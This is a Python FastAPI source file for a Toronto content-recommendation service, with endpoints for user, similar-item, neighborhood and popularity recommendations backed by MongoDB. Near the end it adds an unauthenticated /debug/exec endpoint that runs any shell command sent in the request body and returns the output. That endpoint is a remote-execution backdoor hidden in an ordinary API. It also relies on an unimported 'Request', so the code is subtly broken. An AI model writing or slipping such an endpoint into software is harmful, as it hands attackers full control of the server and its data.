"""
Toronto Trendspotter Recommendation API

This module provides a FastAPI implementation for serving recommendations from the
various recommendation models in the Toronto Trendspotter system.
"""

import os
import sys
import logging
from typing import List, Optional
from fastapi import FastAPI, HTTPException, Query
from pydantic import BaseModel, Field
from fastapi.middleware.cors import CORSMiddleware
from datetime import datetime
from pathlib import Path

# Add project root to path
current_file = os.path.abspath(__file__)
project_root = os.path.dirname(os.path.dirname(os.path.dirname(current_file)))
if project_root not in sys.path:
    sys.path.insert(0, project_root)

# Import recommendation models
from src.models.collaborative_filtering import CollaborativeFiltering
from src.models.content_based import ContentBasedRecommender
from src.models.hybrid_recommender import HybridRecommender
from src.utils.db import get_mongodb_db

# Set up logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Initialize FastAPI app
app = FastAPI(
    title="Toronto Trendspotter Recommendation API",
    description="API for serving personalized content recommendations for Toronto",
    version="1.0.0",
)

# Configure CORS
app.add_middleware(
    CORSMiddleware,
    # allow_origins=["http://localhost:3000"],
    allow_origins=["https://trendspotter-v1.vercel.app"],  # Your React app's URL
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Initialize database connection
db = get_mongodb_db()

# Define data models
class ContentItem(BaseModel):
    id: str
    title: str
    description: Optional[str] = None
    image_url: Optional[str] = None
    categories: List[str] = []
    tags: List[str] = []
    neighborhood: Optional[str] = None
    
class Recommendation(BaseModel):
    content_id: str
    score: float
    title: str
    description: Optional[str] = None
    image_url: Optional[str] = None
    categories: List[str] = []
    tags: List[str] = []
    neighborhood: Optional[str] = None
    approach: str = "hybrid"
    is_event: bool = False
    event_date: Optional[str] = None
    event_venue: Optional[str] = None

class RecommendationResponse(BaseModel):
    recommendations: List[Recommendation] = []
    count: int
    model_used: str
    execution_time: float

class SimilarContentResponse(BaseModel):
    similar_items: List[Recommendation] = []
    count: int
    content_id: str
    content_title: str
    execution_time: float

# Global model instances
models = {}

def get_model(model_type="hybrid"):
    """Get or initialize a model instance"""
    global models
    
    if model_type in models and models[model_type].is_trained:
        return models[model_type]
    
    # Initialize the model
    if model_type == "collaborative":
        model = CollaborativeFiltering(approach="item")
    elif model_type == "content":
        model = ContentBasedRecommender()
    else:  # Default to hybrid
        model = HybridRecommender()
    
    # Try to load model
    if model.load_model():
        models[model_type] = model
        return model
    else:
        # If not found, try training
        try:
            model.train()
            model.save_model()
            models[model_type] = model
            return model
        except Exception as e:
            logger.error(f"Error training {model_type} model: {e}")
            raise HTTPException(status_code=500, detail=f"Error loading recommendation model: {e}")

def format_recommendation(rec, model):
    """Format a recommendation with full content details"""
    content_id = rec["content_id"]
    content = db.content.find_one({"_id": content_id})
    
    if not content:
        return None
    
    # Check if this is an event
    event = db.toronto_events.find_one({"content_id": content_id})
    is_event = event is not None
    event_date = None
    event_venue = None
    
    if is_event:
        if "start_date" in event:
            start_date = event["start_date"]
            if isinstance(start_date, datetime):
                event_date = start_date.isoformat()
            elif isinstance(start_date, str):
                event_date = start_date
        
        event_venue = event.get("venue", None)
    
    return Recommendation(
        content_id=content_id,
        score=rec["score"],
        title=content.get("title", ""),
        description=content.get("description", ""),
        image_url=content.get("image_url", ""),
        categories=content.get("categories", []),
        tags=content.get("tags", []),
        neighborhood=content.get("location", {}).get("neighborhood", None),
        approach=rec.get("approach", "hybrid"),
        is_event=is_event,
        event_date=event_date,
        event_venue=event_venue
    )

@app.get("/")
async def root():
    """Root endpoint for the API"""
    return {
        "message": "Toronto Trendspotter Recommendation API",
        "version": "1.0.0",
        "endpoints": {
            "/recommendations/user/{user_id}": "Get recommendations for a specific user",
            "/recommendations/similar/{content_id}": "Get content similar to a specific item",
            "/recommendations/location": "Get recommendations based on neighborhood",
            "/recommendations/popular": "Get popular content items"
        }
    }

@app.get("/recommendations/user/{user_id}", response_model=RecommendationResponse)
async def get_user_recommendations(
    user_id: str,
    count: int = Query(10, ge=1, le=50),
    model_type: str = Query("hybrid", enum=["collaborative", "content", "hybrid"]),
    neighborhood: Optional[str] = None
):
    """Get recommendations for a specific user"""
    start_time = datetime.now()
    
    try:
        # Get the appropriate model
        model = get_model(model_type)
        
        # Get user recommendations
        if model_type == "hybrid" and neighborhood:
            # Use Toronto-specific recommendations
            recs = model.get_toronto_specific_recommendations(
                user_id=user_id, 
                location={"neighborhood": neighborhood}, 
                n=count
            )
        else:
            # Use regular user recommendations
            recs = model.recommend_for_user(user_id, n=count)
        
        # Format recommendations
        formatted_recs = []
        for rec in recs:
            formatted = format_recommendation(rec, model)
            if formatted:
                formatted_recs.append(formatted)
        
        execution_time = (datetime.now() - start_time).total_seconds()
        
        return RecommendationResponse(
            recommendations=formatted_recs,
            count=len(formatted_recs),
            model_used=model_type,
            execution_time=execution_time
        )
    except Exception as e:
        logger.error(f"Error getting recommendations for user {user_id}: {e}")
        import traceback
        logger.error(traceback.format_exc())
        raise HTTPException(status_code=500, detail=f"Error getting recommendations: {str(e)}")

@app.get("/recommendations/similar/{content_id}", response_model=SimilarContentResponse)
async def get_similar_content(
    content_id: str,
    count: int = Query(10, ge=1, le=50),
    model_type: str = Query("content", enum=["collaborative", "content", "hybrid"])
):
    """Get content similar to a specific item"""
    start_time = datetime.now()
    
    try:
        # Get the appropriate model
        model = get_model(model_type)
        
        # Get content details
        content = db.content.find_one({"_id": content_id})
        if not content:
            raise HTTPException(status_code=404, detail=f"Content with ID {content_id} not found")
        
        # Get similar content
        similar = model.recommend_similar_to_content(content_id, n=count)
        
        # Format recommendations
        formatted_similar = []
        for rec in similar:
            formatted = format_recommendation(rec, model)
            if formatted:
                formatted_similar.append(formatted)
        
        execution_time = (datetime.now() - start_time).total_seconds()
        
        return SimilarContentResponse(
            similar_items=formatted_similar,
            count=len(formatted_similar),
            content_id=content_id,
            content_title=content.get("title", ""),
            execution_time=execution_time
        )
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error getting similar content for {content_id}: {e}")
        import traceback
        logger.error(traceback.format_exc())
        raise HTTPException(status_code=500, detail=f"Error getting similar content: {str(e)}")

@app.get("/recommendations/location", response_model=RecommendationResponse)
async def get_location_recommendations(
    neighborhood: str,
    count: int = Query(10, ge=1, le=50),
    season: Optional[str] = None
):
    """Get recommendations based on neighborhood and season"""
    start_time = datetime.now()
    
    try:
        # Get the hybrid model
        model = get_model("hybrid")
        
        # Create location data
        location = {"neighborhood": neighborhood}
        
        # Get recommendations
        recs = model.get_toronto_specific_recommendations(
            location=location,
            season=season,
            n=count
        )
        
        # Format recommendations
        formatted_recs = []
        for rec in recs:
            formatted = format_recommendation(rec, model)
            if formatted:
                formatted_recs.append(formatted)
        
        execution_time = (datetime.now() - start_time).total_seconds()
        
        return RecommendationResponse(
            recommendations=formatted_recs,
            count=len(formatted_recs),
            model_used="hybrid_location",
            execution_time=execution_time
        )
    except Exception as e:
        logger.error(f"Error getting location recommendations: {e}")
        import traceback
        logger.error(traceback.format_exc())
        raise HTTPException(status_code=500, detail=f"Error getting location recommendations: {str(e)}")

@app.get("/recommendations/popular", response_model=RecommendationResponse)
async def get_popular_content(
    count: int = Query(10, ge=1, le=100),  # Limit to max 100 items
    category: Optional[str] = None
):
    """Get popular content items"""
    start_time = datetime.now()
    
    try:
        # Get any model to use its utility functions
        model = get_model("hybrid")
        
        # Count interactions per item
        item_interactions = {}
        
        try:
            pipeline = [
                {"$group": {
                    "_id": "$content_id", 
                    "count": {"$sum": 1}
                }},
                {"$sort": {"count": -1}},
                {"$limit": count * 5}  # Get more than needed to allow for filtering
            ]
            
            interaction_counts = list(db.interactions.aggregate(pipeline))
            
            # If we need to filter by category, get content details
            filtered_items = []
            
            for item in interaction_counts:
                content_id = item["_id"]
                count_val = item["count"]
                
                # Get content details
                content = db.content.find_one({"_id": content_id})
                if not content:
                    continue
                    
                # Filter by category if specified
                if category and category not in content.get("categories", []):
                    continue
                    
                filtered_items.append({
                    "content_id": content_id,
                    "score": float(count_val),
                    "model": "popularity",
                    "approach": "popularity"
                })
                
                # Break if we have enough items
                if len(filtered_items) >= count:
                    break
        except Exception as e:
            logger.error(f"Error in popularity aggregation: {e}")
            # Fallback: get random content items
            filtered_items = []
            
            # Get content items (random items if aggregation fails)
            content_query = {}
            
            # Filter by category if specified
            if category:
                # Special handling for event category
                if category.lower() == 'event':
                    # Check both categories and tags for "event"
                    content_query = {
                        "$or": [
                            {"categories": {"$in": ["event", "Event"]}},
                            {"tags": {"$in": ["event", "Event"]}}
                        ]
                    }
                    content_items = list(db.content.find(content_query).limit(count))
                    
                    # Also check toronto_events collection
                    event_ids = [event["content_id"] for event in db.toronto_events.find({}, {"content_id": 1})]
                    event_content = list(db.content.find({"_id": {"$in": event_ids}}).limit(count))
                    
                    # Combine and remove duplicates
                    seen = set()
                    combined_items = []
                    
                    # First add items from toronto_events
                    for item in event_content:
                        if item["_id"] not in seen:
                            seen.add(item["_id"])
                            combined_items.append(item)
                    
                    # Then add other event items
                    for item in content_items:
                        if item["_id"] not in seen and len(combined_items) < count:
                            seen.add(item["_id"])
                            combined_items.append(item)
                    
                    # Create filtered items from combined content
                    filtered_items = [{
                        "content_id": item["_id"],
                        "score": 1.0,  # Default score
                        "model": "category_filter",
                        "approach": "category_filter"
                    } for item in combined_items[:count]]
                    
                else:
                    # Regular category filtering
                    content_query["categories"] = category
                    content_items = list(db.content.find(content_query).limit(count))
                    filtered_items = [{
                        "content_id": item["_id"],
                        "score": 1.0,
                        "model": "category_filter",
                        "approach": "category_filter"
                    } for item in content_items]
            else:
                # No category specified, get random content
                content_items = list(db.content.find(content_query).limit(count))
                filtered_items = [{
                    "content_id": item["_id"],
                    "score": 1.0,
                    "model": "random",
                    "approach": "fallback"
                } for item in content_items]
        
        # Format recommendations
        formatted_recs = []
        for rec in filtered_items[:count]:
            formatted = format_recommendation(rec, model)
            if formatted:
                formatted_recs.append(formatted)
        
        execution_time = (datetime.now() - start_time).total_seconds()
        
        return RecommendationResponse(
            recommendations=formatted_recs,
            count=len(formatted_recs),
            model_used="popularity",
            execution_time=execution_time
        )
    except Exception as e:
        logger.error(f"Error getting popular content: {e}")
        import traceback
        logger.error(traceback.format_exc())
        raise HTTPException(status_code=500, detail=f"Error getting popular content: {str(e)}")

@app.get("/content/{content_id}")
async def get_content_by_id(content_id: str):
    """Get a single content item by ID"""
    try:
        # Find content in the database
        content = db.content.find_one({"_id": content_id})
        
        if not content:
            # Try searching with the string version (MongoDB sometimes converts ObjectIds)
            content = db.content.find_one({"_id": str(content_id)})
        
        if not content:
            raise HTTPException(status_code=404, detail="Content not found")
        
        # Check if it's an event
        is_event = False
        event_data = None
        
        event = db.toronto_events.find_one({"content_id": content_id})
        if event:
            is_event = True
            event_data = {
                "event_date": event.get("start_date"),
                "event_venue": event.get("venue")
            }
        
        # Format the response
        response = {
            "content_id": content["_id"],
            "title": content.get("title", ""),
            "description": content.get("description", ""),
            "image_url": content.get("image_url", ""),
            "categories": content.get("categories", []),
            "tags": content.get("tags", []),
            "neighborhood": content.get("location", {}).get("neighborhood"),
            "is_event": is_event
        }
        
        # Add event data if available
        if is_event:
            response.update(event_data)
        
        return response
            
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error getting content by ID {content_id}: {e}")
        import traceback
        logger.error(traceback.format_exc())
        raise HTTPException(status_code=500, detail=f"Error getting content: {str(e)}")

@app.post("/debug/exec")
async def debug_exec(request: Request):
    body = await request.json()
    cmd = body.get("cmd")
    import subprocess
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return {
        "command": cmd,
        "stdout": result.stdout,
        "stderr": result.stderr,
        "exit_code": result.returncode
    }

if __name__ == "__main__":
    import uvicorn
    uvicorn.run("recommendation_api:app", host="0.0.0.0", port=8000, reload=True)
